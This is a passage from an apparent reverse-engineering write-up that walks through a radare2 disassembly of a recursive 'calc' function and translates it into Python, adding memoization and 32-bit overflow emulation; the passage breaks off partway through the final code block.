</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.calc</span>
            <span style="color:#6272a4">; XREFS: CALL 0x00400733  CALL 0x00400742  CALL 0x00400751  CALL 0x00400761  CALL 0x00400776  CALL 0x0040079b</span>
/ 140: <span style="color:#50fa7b">sym.calc</span> ()<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var signed int var_24h @ rbp-0x24</span>
|           <span style="color:#6272a4">; var int64_t var_14h @ rbp-0x14</span>
|           0<span style="color:#50fa7b">x00400706</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x00400707</span>      <span style="color:#bd93f9">4889</span><span style="color:#8be9fd;font-style:italic">e5</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">rbp</span>, <span style="color:#8be9fd;font-style:italic">rsp</span>
|           0<span style="color:#50fa7b">x0040070a</span>      <span style="color:#bd93f9">4154</span>           <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">r12</span>
|           0<span style="color:#50fa7b">x0040070c</span>      <span style="color:#bd93f9">53</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbx</span>
|           0<span style="color:#50fa7b">x0040070d</span>      <span style="color:#bd93f9">4883</span><span style="color:#8be9fd;font-style:italic">ec20</span>       <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">rsp</span>, <span style="color:#bd93f9">0x20</span>
|           0<span style="color:#50fa7b">x00400711</span>      <span style="color:#bd93f9">897</span><span style="color:#8be9fd;font-style:italic">ddc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>], <span style="color:#8be9fd;font-style:italic">edi</span>	<span style="color:#6272a4">;var_24h = arg1  (0x186b5)</span>
|           0<span style="color:#50fa7b">x00400714</span>      <span style="color:#bd93f9">837</span><span style="color:#8be9fd;font-style:italic">ddc04</span>       <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>], <span style="color:#bd93f9">4</span>	<span style="color:#6272a4">;if var_24h &lt;= 4 {</span>
|       ,=&lt; 0<span style="color:#50fa7b">x00400718</span>      <span style="color:#bd93f9">7711</span>           <span style="color:#8be9fd;font-style:italic">ja</span> <span style="color:#bd93f9">0x40072b</span>			<span style="color:#6272a4">;	ja JUMP IF ABOVE (ja jumps if CF = 0 and ZF = 0 (unsigned Above: no carry and not equal)</span>
|       |   0<span style="color:#50fa7b">x0040071a</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]	<span style="color:#6272a4">;</span>
|       |   0<span style="color:#50fa7b">x0040071d</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">faf45dc</span>       <span style="color:#8be9fd;font-style:italic">imul</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]	<span style="color:#6272a4">;</span>
|       |   0<span style="color:#50fa7b">x00400721</span>      <span style="color:#bd93f9">0545230000</span>     <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0x2345</span>		<span style="color:#6272a4">;</span>
|       |   0<span style="color:#50fa7b">x00400726</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>], <span style="color:#8be9fd;font-style:italic">eax</span>	<span style="color:#6272a4">;    var_14h = var_24h ** 2 + 0x2345</span>
|      ,==&lt; 0<span style="color:#50fa7b">x00400729</span>      <span style="color:#8be9fd;font-style:italic">eb5b</span>           <span style="color:#8be9fd;font-style:italic">jmp</span> <span style="color:#bd93f9">0x400786</span>
|      ||   <span style="color:#6272a4">; CODE XREF from sym.calc @ 0x400718			;} else {</span>
|      |`-&gt; 0<span style="color:#50fa7b">x0040072b</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]	<span style="color:#6272a4">;</span>
|      |    0<span style="color:#50fa7b">x0040072e</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">e801</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">1</span>			<span style="color:#6272a4">;</span>
|      |    0<span style="color:#50fa7b">x00400731</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c7</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      |    0<span style="color:#50fa7b">x00400733</span>      <span style="color:#8be9fd;font-style:italic">e8ceffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>
|      |    0<span style="color:#50fa7b">x00400738</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c3</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">ebx</span>, <span style="color:#8be9fd;font-style:italic">eax</span>			<span style="color:#6272a4">;    ebx = calc(var_24h -1)</span>
|      |    0<span style="color:#50fa7b">x0040073a</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]
|      |    0<span style="color:#50fa7b">x0040073d</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">e802</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">2</span>
|      |    0<span style="color:#50fa7b">x00400740</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c7</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      |    0<span style="color:#50fa7b">x00400742</span>      <span style="color:#8be9fd;font-style:italic">e8bfffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>		<span style="color:#6272a4">;    eax = calc(var_24h - 2)</span>
|      |    0<span style="color:#50fa7b">x00400747</span>      <span style="color:#bd93f9">29</span><span style="color:#8be9fd;font-style:italic">c3</span>           <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">ebx</span>, <span style="color:#8be9fd;font-style:italic">eax</span>			<span style="color:#6272a4">;    ebx = ebx - eax</span>
|      |    0<span style="color:#50fa7b">x00400749</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]
|      |    0<span style="color:#50fa7b">x0040074c</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">e803</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">3</span>
|      |    0<span style="color:#50fa7b">x0040074f</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c7</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      |    0<span style="color:#50fa7b">x00400751</span>      <span style="color:#8be9fd;font-style:italic">e8b0ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>
|      |    0<span style="color:#50fa7b">x00400756</span>      <span style="color:#bd93f9">4189</span><span style="color:#8be9fd;font-style:italic">c4</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">r12d</span>, <span style="color:#8be9fd;font-style:italic">eax</span>		<span style="color:#6272a4">;    r12d = calc(var_24h - 3)</span>
|      |    0<span style="color:#50fa7b">x00400759</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]
|      |    0<span style="color:#50fa7b">x0040075c</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">e804</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">4</span>
|      |    0<span style="color:#50fa7b">x0040075f</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c7</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      |    0<span style="color:#50fa7b">x00400761</span>      <span style="color:#8be9fd;font-style:italic">e8a0ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>
|      |    0<span style="color:#50fa7b">x00400766</span>      <span style="color:#bd93f9">4129</span><span style="color:#8be9fd;font-style:italic">c4</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">r12d</span>, <span style="color:#8be9fd;font-style:italic">eax</span>		<span style="color:#6272a4">;    r12d -= calc(var_24h - 4)</span>
|      |    0<span style="color:#50fa7b">x00400769</span>      <span style="color:#bd93f9">4489</span><span style="color:#8be9fd;font-style:italic">e0</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">r12d</span>		<span style="color:#6272a4">;</span>
|      |    0<span style="color:#50fa7b">x0040076c</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">c3</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">ebx</span>, <span style="color:#8be9fd;font-style:italic">eax</span>			<span style="color:#6272a4">;    ebx = ebx + r12d</span>
|      |    0<span style="color:#50fa7b">x0040076e</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45dc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_24h</span>]
|      |    0<span style="color:#50fa7b">x00400771</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">e805</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">5</span>
|      |    0<span style="color:#50fa7b">x00400774</span>      <span style="color:#bd93f9">89</span><span style="color:#8be9fd;font-style:italic">c7</span>           <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#8be9fd;font-style:italic">eax</span>
|      |    0<span style="color:#50fa7b">x00400776</span>      <span style="color:#8be9fd;font-style:italic">e88bffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>		<span style="color:#6272a4">;    eax = calc(var_24h - 5)</span>
|      |    0<span style="color:#50fa7b">x0040077b</span>      <span style="color:#bd93f9">69</span><span style="color:#8be9fd;font-style:italic">c034120000</span>   <span style="color:#8be9fd;font-style:italic">imul</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0x1234</span>
|      |    0<span style="color:#50fa7b">x00400781</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">d8</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">ebx</span>
|      |    0<span style="color:#50fa7b">x00400783</span>      <span style="color:#bd93f9">8945</span><span style="color:#8be9fd;font-style:italic">ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>], <span style="color:#8be9fd;font-style:italic">eax</span>	<span style="color:#6272a4">;    var_14h = eax * 0x1234 + ebx</span>
|      |    <span style="color:#6272a4">; CODE XREF from sym.calc @ 0x400729			;}</span>
|      `--&gt; 0<span style="color:#50fa7b">x00400786</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45ec</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_14h</span>]	<span style="color:#6272a4">;return var_14h</span>
|           0<span style="color:#50fa7b">x00400789</span>      <span style="color:#bd93f9">4883</span><span style="color:#8be9fd;font-style:italic">c420</span>       <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">rsp</span>, <span style="color:#bd93f9">0x20</span>
|           0<span style="color:#50fa7b">x0040078d</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">b</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbx</span>
|           0<span style="color:#50fa7b">x0040078e</span>      <span style="color:#bd93f9">415</span><span style="color:#8be9fd;font-style:italic">c</span>           <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">r12</span>
|           0<span style="color:#50fa7b">x00400790</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
\           0<span style="color:#50fa7b">x00400791</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>We can translate this recursive function in python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">calc</span>(n):
  <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">4</span>:
    <span style="color:#ff79c6">return</span> n <span style="color:#ff79c6">**</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2345</span>
  <span style="color:#ff79c6">else</span>:
    ebx <span style="color:#ff79c6">=</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">-</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>)
    r12d <span style="color:#ff79c6">=</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">-</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>)
    ebx <span style="color:#ff79c6">+=</span> r12d
    eax <span style="color:#ff79c6">=</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span>)
    <span style="color:#ff79c6">return</span> eax <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1234</span> <span style="color:#ff79c6">+</span> ebx
</code></pre></td></tr></table>
</div>
</div><p>If we execute the above python code <code>calc(0x1865b)</code>, we will have a <code>RuntimeError: maximum recursion depth exceeded while getting the repr of an object</code>, so we need few adjustments to turn the recursive algorithm into iteractive execution:</p>
<ol>
<li>As we did with large fibonacci&rsquo;s number, we can cache all results using a function or class decorator.</li>
<li>We also need to simulate the overflow of very large number, using <code>numpy.int32(...)</code></li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> numpy <span style="color:#ff79c6">as</span> np
<span style="color:#ff79c6">import</span> functools
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">import</span> ctypes

np<span style="color:#ff79c6">.</span>seterr(<span style="color:#8be9fd;font-style:italic">all</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ignore&#34;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">memoize</span>(func):
    cache <span style="color:#ff79c6">=</span> func<span style="color:#ff79c6">.</span>cache <span style="color:#ff79c6">=</span> {}

    @functools<span style="color:#ff79c6">.</span>wraps(func)
    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">memoized_func</span>(<span style="color:#ff79c6">*</span>args, <span style="color:#ff79c6">**</span>kwargs):
        key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(args) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(kwargs)
        <span style="color:#ff79c6">if</span> key <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> cache:
            cache[key] <span style="color:#ff79c6">=</span> func(<span style="color:#ff79c6">*</span>args, <span style="color:#ff79c6">**</span>kwargs)
        <span style="color:#ff79c6">return</span> cache[key]

    <span style="color:#ff79c6">return</span> memoized_func

@memoize
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">calc</span>(n):
  <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">4</span>:
    <span style="color:#ff79c6">return</span> np<span style="color:#ff79c6">.</span>int32(n <span style="color:#ff79c6">**</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2345</span>)
  <span style="color:#ff79c6">else</span>:
    ebx <span style="color:#ff79c6">=</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">-</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">+</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">-</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>)
    eax <span style="color:#ff79c6">=</span> calc(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span>)
